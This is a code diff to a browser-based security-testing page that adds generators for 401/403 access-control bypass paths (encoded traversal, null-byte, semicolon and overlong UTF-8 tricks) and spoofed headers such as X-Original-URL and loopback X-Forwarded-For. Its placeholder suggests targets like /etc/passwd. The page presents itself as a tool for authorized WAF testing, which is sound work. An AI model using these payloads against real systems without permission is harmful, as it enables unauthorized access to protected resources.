@@ -38,12 +38,13 @@ h2.section{font-size:.85rem;text-transform:uppercase;letter-spacing:.04em;color:
 .status.warn{color:var(--warn);}
 .status.note{color:var(--muted);}
 .empty{color:var(--muted);font-size:.9rem;padding:20px 0;text-align:center;}
+.desc{color:var(--muted);font-size:.82rem;line-height:1.5;margin:-4px 0 10px;}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <h1>🥷 Obfuscation Toolkit</h1>
-  <p class="sub">Enter a word, file path, or URL to generate common encoding/obfuscation variants used to test whether filters, WAFs, IDS/AV, or input validation correctly normalize and catch disguised input. Each variant is checked against the original where a decode exists. For authorized security testing on systems you own or have permission to test — not for evading controls on systems you don't.</p>
+  <h1>🥷 Obfuscation & 403 Bypass Toolkit</h1>
+  <p class="sub">Enter a word, path, or URL to generate encoding/obfuscation variants and access-control (401/403) bypass patterns — for checking whether your WAF, reverse proxy, and app layer agree on what's blocked. Variants are checked against the original where a decode exists; path-normalization tricks are noted instead, since they rely on server-side parsing quirks rather than byte-for-byte decoding. For authorized testing on systems you own or have permission to test only.</p>
 
   <div class="input-card">
     <textarea id="input" placeholder="e.g. admin, /etc/passwd, ../../boot.ini, https://example.com/login"></textarea>
@@ -102,6 +103,22 @@ function dotSegmentPad(s){ return s.replaceAll('/', '/./'); }
 function doubleSlash(s){ return s.replaceAll('/', '//'); }
 function overlongSlash(s){ return s.replaceAll('/', '%c0%af'); }
 
+// --- 403/access-control bypass helpers: normalize any word/path/URL into a path + basename ---
+function decomposePath(input){
+  let raw = (input || '').trim();
+  let path;
+  try{ path = new URL(raw).pathname; }catch(e){ path = raw.startsWith('/') ? raw : '/'+raw; }
+  if(path.length > 1) path = path.replace(/\/+$/,'');
+  const segs = path.split('/').filter(Boolean);
+  const name = segs.length ? segs[segs.length-1] : 'admin';
+  const prefix = path.slice(0, path.length - name.length);
+  return {path, name, prefix};
+}
+function hex2(ch){ return ch.charCodeAt(0).toString(16).padStart(2,'0'); }
+function encFirstChar(name){ return '%'+hex2(name[0])+name.slice(1); }
+function doubleEncFirstChar(name){ return '%25'+hex2(name[0]).toUpperCase()+name.slice(1); }
+function randomCasePath(s){ return s.split('').map(c=>Math.random()<0.5?c.toUpperCase():c.toLowerCase()).join(''); }
+
 const generalGroup = {
   title: 'Character & Text Encoding',
   items: [
@@ -129,6 +146,76 @@ const pathGroup = {
   ]
 };
 
+const http403Group = {
+  title: 'HTTP 401/403 Access-Control Bypass Patterns',
+  desc: 'Each pattern below reapplies a known parsing-discrepancy trick to the path you entered. The idea: the component enforcing access control (WAF/proxy) and the component serving content (app/origin) may normalize the URL differently — one blocks the literal string, the other resolves the trick straight to the protected resource.',
+  items: [
+    {name:'Trailing Slash', fn:i=>decomposePath(i).path+'/'},
+    {name:'Double Trailing Slash', fn:i=>decomposePath(i).path+'//'},
+    {name:'Dot Suffix', fn:i=>decomposePath(i).path+'/.'},
+    {name:'Dot-Slash Suffix', fn:i=>decomposePath(i).path+'/./'},
+    {name:'Double-Dot Suffix (no slash)', fn:i=>decomposePath(i).path+'..'},
+    {name:'Semicolon Suffix', fn:i=>decomposePath(i).path+';/'},
+    {name:'Encoded Space Suffix', fn:i=>decomposePath(i).path+'%20'},
+    {name:'Encoded Tab Suffix', fn:i=>decomposePath(i).path+'%09'},
+    {name:'Null Byte Suffix', fn:i=>decomposePath(i).path+'%00'},
+    {name:'Fragment Suffix', fn:i=>decomposePath(i).path+'#'},
+    {name:'Query Suffix', fn:i=>decomposePath(i).path+'?'},
+    {name:'Double Query Suffix', fn:i=>decomposePath(i).path+'??'},
+    {name:'Encoded First Character', fn:i=>{const {prefix,name}=decomposePath(i); return prefix+encFirstChar(name);}},
+    {name:'Encoded Trailing Slash', fn:i=>decomposePath(i).path+'%2f'},
+    {name:'Encoded ../ Prefix', fn:i=>'/%2e%2e'+decomposePath(i).path},
+    {name:'Traversal Prefix (encoded slash)', fn:i=>'/..%2f'+decomposePath(i).name},
+    {name:'Double-Encoded Traversal Prefix', fn:i=>'/..%252f'+decomposePath(i).name},
+    {name:'Overlong UTF-8 Slash Suffix', fn:i=>decomposePath(i).path+'%c0%af'},
+    {name:'Double-Encoded First Character', fn:i=>{const {prefix,name}=decomposePath(i); return prefix+doubleEncFirstChar(name);}},
+    {name:'Semicolon + Traversal', fn:i=>decomposePath(i).path+'/..;/'},
+    {name:'Double Leading Slash', fn:i=>'//'+decomposePath(i).name},
+    {name:'Dot-Slash Prefix', fn:i=>'/./'+decomposePath(i).name},
+    {name:'Semicolon Param + Suffix', fn:i=>decomposePath(i).path+'/.;/anything'},
+    {name:'Encoded Trailing Dot', fn:i=>decomposePath(i).path+'%2e'},
+    {name:'Append .json', fn:i=>decomposePath(i).path+'.json'},
+    {name:'Append .css', fn:i=>decomposePath(i).path+'.css'},
+    {name:'Append .html', fn:i=>decomposePath(i).path+'.html'},
+    {name:'Segment .json', fn:i=>decomposePath(i).path+'/.json'},
+    {name:'Traversal + .css', fn:i=>decomposePath(i).path+'/..;/.css'},
+    {name:'Null Byte + Extension', fn:i=>decomposePath(i).path+'%00.jpg'},
+    {name:'Null Byte + Slash', fn:i=>decomposePath(i).path+'%00/'},
+    {name:'Literal \\x00 Suffix', fn:i=>decomposePath(i).path+'\\x00'},
+    {name:'Query With Params', fn:i=>decomposePath(i).path+'?a=b'},
+    {name:'Trailing Slash + Query', fn:i=>decomposePath(i).path+'/?anything=1'},
+    {name:'Encoded Question Mark', fn:i=>decomposePath(i).path+'%3Fparam=1'},
+    {name:'Random Case Path', fn:i=>{const {prefix,name}=decomposePath(i); return prefix+randomCasePath(name);}},
+    {name:'Uppercase Path', fn:i=>{const {prefix,name}=decomposePath(i); return prefix+name.toUpperCase();}},
+    {name:'Triple Leading Slash', fn:i=>'///'+decomposePath(i).name},
+    {name:'Encoded Leading Slash', fn:i=>'/%2f'+decomposePath(i).name},
+    {name:'Double-Encoded Trailing Slash', fn:i=>decomposePath(i).path+'%252f'},
+    {name:'Overlong UTF-8 Backslash', fn:i=>decomposePath(i).path+'%c1%9c'},
+    {name:'Leading Encoded Tab', fn:i=>'/%09'+decomposePath(i).name},
+    {name:'Self-Referential Traversal', fn:i=>{const {prefix,name}=decomposePath(i); return prefix+name+'/../'+name;}},
+  ]
+};
+
+const headerGroup = {
+  title: 'HTTP Header Bypass Techniques',
+  desc: 'Send one of these alongside a request to the path — different proxy/CDN/app layers sometimes trust different origin, IP, or path headers, so their access-control decisions can disagree. Also worth testing: alternate methods (HEAD, POST, PUT, OPTIONS, TRACE) since some rules only cover GET.',
+  items: [
+    {name:'X-Original-URL', fn:i=>'X-Original-URL: '+decomposePath(i).path},
+    {name:'X-Rewrite-URL', fn:i=>'X-Rewrite-URL: '+decomposePath(i).path},
+    {name:'X-Custom-IP-Authorization', fn:()=>'X-Custom-IP-Authorization: 127.0.0.1'},
+    {name:'X-Forwarded-For (loopback)', fn:()=>'X-Forwarded-For: 127.0.0.1'},
+    {name:'X-Forwarded-For (localhost)', fn:()=>'X-Forwarded-For: localhost'},
+    {name:'X-Forwarded-Host', fn:()=>'X-Forwarded-Host: 127.0.0.1'},
+    {name:'X-Client-IP', fn:()=>'X-Client-IP: 127.0.0.1'},
+    {name:'X-Remote-IP', fn:()=>'X-Remote-IP: 127.0.0.1'},
+    {name:'X-Remote-Addr', fn:()=>'X-Remote-Addr: 127.0.0.1'},
+    {name:'X-Host', fn:()=>'X-Host: 127.0.0.1'},
+    {name:'True-Client-IP', fn:()=>'True-Client-IP: 127.0.0.1'},
+    {name:'Referer', fn:i=>'Referer: '+decomposePath(i).path},
+    {name:'X-HTTP-Method-Override', fn:()=>'X-HTTP-Method-Override: GET'},
+  ]
+};
+
 function render(input){
   const results = document.getElementById('results');
   results.innerHTML = '';
@@ -136,12 +223,20 @@ function render(input){
 
   const groups = [generalGroup];
   if(input.includes('/') || input.includes('\\')) groups.push(pathGroup);
+  groups.push(http403Group, headerGroup);
 
   groups.forEach(group=>{
     const h = document.createElement('h2');
     h.className = 'section';
     h.textContent = group.title;
     results.appendChild(h);
+
+    if(group.desc){
+      const d = document.createElement('p');
+      d.className = 'desc';
+      d.textContent = group.desc;
+      results.appendChild(d);
+    }
 
     const grid = document.createElement('div');
     grid.className = 'grid';
